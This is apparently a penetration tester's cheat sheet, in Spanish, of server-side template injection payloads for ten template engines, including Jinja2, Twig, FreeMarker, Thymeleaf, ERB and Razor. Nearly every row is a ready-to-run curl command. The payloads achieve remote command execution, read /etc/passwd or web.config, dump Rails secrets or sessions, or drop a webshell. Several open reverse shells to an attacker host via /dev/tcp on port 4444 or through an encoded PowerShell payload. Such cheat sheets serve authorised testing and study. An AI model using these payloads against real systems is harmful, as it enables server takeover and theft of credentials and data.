---
aliases:
  - SSTI RCE
  - Template Engine RCE
  - SSTI Execution
tags:
  - type/cheatsheet
  - vuln/ssti
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Server-Side Template Injection (SSTI)]]'
---
# SSTI - Ejecución por Engine

***

## Jinja2 (Python / Flask)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -G "https://target/page" --data-urlencode "q={{7*7}}"` | Output `49` confirma SSTI Jinja2/Twig | Detección inicial. |
| `curl -G "https://target/page" --data-urlencode "q={{config}}"` | Dump del Flask config object | Confirmar context Flask. |
| `curl -G "https://target/page" --data-urlencode "q={{''.__class__.__mro__[1].__subclasses__()}}"` | Lista clases Python disponibles | Pre-RCE — buscar index. |
| `curl -G "https://target/page" --data-urlencode "q={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"` | RCE via os.popen + return output | Sandbox laxo. |
| `curl -G "https://target/page" --data-urlencode "q={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"` | RCE via config object | Si self filtrado. |
| `curl -G "https://target/page" --data-urlencode "q={{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}"` | RCE via lipsum (Flask helper) | Lipsum siempre disponible Flask. |
| `curl -G "https://target/page" --data-urlencode "q={{cycler.__init__.__globals__.os.popen('id').read()}}"` | RCE via cycler (Jinja2 helper) | Sandbox parcial. |
| `curl -G "https://target/page" --data-urlencode "q={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"` | RCE via request | Si self / config filtrados. |
| `curl -G "https://target/page" --data-urlencode "q={{''.__class__.__mro__[1].__subclasses__()[<idx>](['bash','-c','bash -i >& /dev/tcp/IP/4444 0>&1'])}}"` | Reverse shell via Popen subclass | Index varies — enumerar primero. |
| `curl -G "https://target/page" --data-urlencode "q={{''.__class__.__mro__[1].__subclasses__()[<idx>]('/etc/passwd').read()}}"` | File read via TextIOWrapper subclass | LFI. |
^ssti-engine-jinja2

___

## Twig (PHP / Symfony)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -G "https://target/page" --data-urlencode "q={{7*'7'}}"` | Output `7777777` (string mult) — Twig vs Jinja2 (49) | Detección differential. |
| `curl -G "https://target/page" --data-urlencode "q={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"` | RCE Twig 1.x clásico | Pre-Twig 2.x. |
| `curl -G "https://target/page" --data-urlencode "q={{['id']\|filter('system')}}"` | RCE Twig 2.x sandbox bypass via filter callback | Sandbox extension habilitada. |
| `curl -G "https://target/page" --data-urlencode "q={{['id',''] \|sort('system')}}"` | RCE via sort callback | Sort filter accept callable. |
| `curl -G "https://target/page" --data-urlencode "q={{['id']\|map('passthru')\|join('')}}"` | RCE via map filter | Map callback. |
| `curl -G "https://target/page" --data-urlencode "q={{['id']\|filter('passthru')}}"` | RCE direct passthru output | passthru function. |
| `curl -G "https://target/page" --data-urlencode "q={{app.request.server.get('HTTP_HOST')}}"` | Server config disclosure (Symfony) | Symfony stack. |
| `curl -G "https://target/page" --data-urlencode "q={{app.session}}"` | Dump session data | Symfony app context. |
| `curl -G "https://target/page" --data-urlencode "q={{_self.env.getTemplateSource('file.twig')}}"` | Template source disclosure | Twig env access. |
^ssti-engine-twig

___

## Smarty (PHP)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -G "https://target/page" --data-urlencode "q={7*7}"` | Output `49` (delimitador `{` simple) | Detección Smarty. |
| `curl -G "https://target/page" --data-urlencode "q={system('id')}"` | RCE direct PHP function call | Smarty v2 / `php_handling=PHP_PASSTHRU`. |
| `curl -G "https://target/page" --data-urlencode "q={php}echo \`id\`;{/php}"` | RCE bloque PHP raw | Smarty v2 con php block enabled. |
| `curl -G "https://target/page" --data-urlencode "q={Smarty_Internal_Write_File::writeFile(\$SCRIPT_NAME,'<?=\`\$_GET[c]\`?>',self::clearConfig())}"` | Webshell drop via static | Smarty v3 `{php}` deshabilitado. |
| `curl -G "https://target/page" --data-urlencode "q={self::getStreamVariable('file:///etc/passwd')}"` | LFI via stream variable | Smarty 3 file read. |
| `curl -G "https://target/page" --data-urlencode "q={if system('id')}{/if}"` | RCE en branch eval | `{if}` con función PHP. |
^ssti-engine-smarty

___

## FreeMarker (Java)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -G "https://target/page" --data-urlencode "q=\${7*7}"` | Output `49` | Detección FreeMarker/Velocity/Mako/Thymeleaf. |
| `curl -G "https://target/page" --data-urlencode "q=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"` | RCE via Execute class | Default FreeMarker. |
| `curl -G "https://target/page" --data-urlencode "q=\${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",[\"id\"]).start()}"` | RCE via ObjectConstructor | Si Execute bloqueado. |
| `curl -G "https://target/page" --data-urlencode "q=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"bash -c {echo,$(echo 'bash -i >& /dev/tcp/IP/4444 0>&1' \| base64 -w0)}|{base64,-d}|bash\")}"` | Reverse shell base64-encoded | Avoid escape issues. |
| `curl -G "https://target/page" --data-urlencode "q=<#include \"/etc/passwd\">"` | File read via include | Include directiva. |
| `curl -G "https://target/page" --data-urlencode "q=\${\"java.lang.Runtime\".getRuntime().exec(\"id\")}"` | RCE via reflection | Si reflection allowed. |
^ssti-engine-freemarker

___

## Velocity (Java)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -G "https://target/page" --data-urlencode "q=#set(\$x=7*7)\$x"` | Output `49` | Detección Velocity. |
| `curl -G "https://target/page" --data-urlencode "q=#set(\$s='')#set(\$stringClass=\$s.getClass())#set(\$runtime=\$stringClass.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null))\$runtime.exec('id')"` | RCE via reflection chain | Velocity 1.x. |
| `curl -G "https://target/page" --data-urlencode "q=#set(\$file=\$s.getClass().forName('java.io.File').getConstructor(\$stringClass).newInstance('/etc/passwd'))"` | File constructor reflection | LFI. |
^ssti-engine-velocity

___

## Thymeleaf (Spring)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -G "https://target/page" --data-urlencode "q=\${7*7}"` o `[[\${7*7}]]` | Output `49` | Detección Thymeleaf en server-side context. |
| `curl -G "https://target/page" --data-urlencode "q=\${T(java.lang.Runtime).getRuntime().exec('id')}"` | RCE SpringEL via T() | Thymeleaf attribute context. |
| `curl -G "https://target/page" --data-urlencode "q=[[\${T(java.lang.Runtime).getRuntime().exec('id')}]]"` | RCE inline syntax | Inline expression. |
| `curl -G "https://target/page" --data-urlencode "q=\${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}"` | RCE + capture output | IOUtils para capturar stdout. |
| `curl -G "https://target/page" --data-urlencode "q=\${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream(),T(java.nio.charset.Charset).forName('UTF-8'))}"` | File read + capture | LFI con StreamUtils. |
| `curl -G "https://target/page" --data-urlencode "q=__\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"` | Bypass filter via expression preprocessor | Filter naive. |
^ssti-engine-thymeleaf

___

## ERB (Ruby / Rails)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -G "https://target/page" --data-urlencode "q=<%= 7*7 %>"` | Output `49` | Detección ERB. |
| `curl -G "https://target/page" --data-urlencode "q=<%= \`id\` %>"` | RCE via backticks (Ruby exec) | Direct exec. |
| `curl -G "https://target/page" --data-urlencode "q=<%= IO.popen('id').read %>"` | RCE + capture stdout | IO.popen capture. |
| `curl -G "https://target/page" --data-urlencode "q=<%= system('id') %>"` | RCE (output a stdout, no captura) | Quick test. |
| `curl -G "https://target/page" --data-urlencode "q=<%= File.read('/etc/passwd') %>"` | File read | LFI. |
| `curl -G "https://target/page" --data-urlencode "q=<%= ActiveRecord::Base.connection.execute('SELECT version()').first %>"` | DB query (Rails console gadget) | Rails app. |
| `curl -G "https://target/page" --data-urlencode "q=<%= Rails.application.secrets %>"` | Rails secrets disclosure | Rails app. |
| `curl -G "https://target/page" --data-urlencode "q=<%= \`bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'\` %>"` | Reverse shell | Direct exec backticks. |
^ssti-engine-erb

___

## Mako (Python)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -G "https://target/page" --data-urlencode "q=\${7*7}"` | Output `49` | Detección Mako. |
| `curl -G "https://target/page" --data-urlencode "q=\${os.popen('id').read()}"` | RCE inline expression | os ya importado. |
| `curl -G "https://target/page" --data-urlencode "q=<% import os %>\${os.system('id')}"` | RCE con import explícito | Sandbox laxo. |
| `curl -G "https://target/page" --data-urlencode "q=\${__import__('subprocess').check_output('id', shell=True)}"` | RCE via subprocess | Build-in import. |
| `curl -G "https://target/page" --data-urlencode "q=\${open('/etc/passwd').read()}"` | File read | LFI direct. |
| `curl -G "https://target/page" --data-urlencode "q=\${self.module.cache.util.os.system('id')}"` | RCE via self chain | Si self disponible. |
| `curl -G "https://target/page" --data-urlencode "q=\${__import__('os').system('bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"')}"` | Reverse shell one-liner | Direct system. |
^ssti-engine-mako

___

## Handlebars (Node.js)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -G "https://target/page" --data-urlencode "q={{7*7}}"` | NO ejecuta (logic-less) | Detección negativa Handlebars. |
| Use Handlebars logic-less RCE gadget (require chain via lookup/sub.constructor) | RCE via require gadget | Stack Node.js + Handlebars. |
| Test prototype pollution combo enviando `{"__proto__":{"isAdmin":true}}` | Combo PP + Handlebars | Stack JS vulnerable a ambos. |
^ssti-engine-handlebars

___

## Razor (.NET)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -G "https://target/page" --data-urlencode "q=@(7*7)"` | Output `49` | Detección Razor. |
| `curl -G "https://target/page" --data-urlencode "q=@{System.Diagnostics.Process.Start(\"calc.exe\");}"` | RCE direct .NET | Razor inline block. |
| `curl -G "https://target/page" --data-urlencode "q=@{System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(\"cmd.exe\",\"/c id\"){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd();}"` | RCE + capture stdout | Comando con output. |
| `curl -G "https://target/page" --data-urlencode "q=@System.IO.File.ReadAllText(\"C:\\inetpub\\wwwroot\\web.config\")"` | File read web.config | Disclosure config + machine keys. |
| `curl -G "https://target/page" --data-urlencode "q=@{System.Diagnostics.Process.Start(\"powershell.exe\",\"-enc <base64>\");}"` | PowerShell encoded payload | Reverse shell encoded. |
^ssti-engine-razor

***
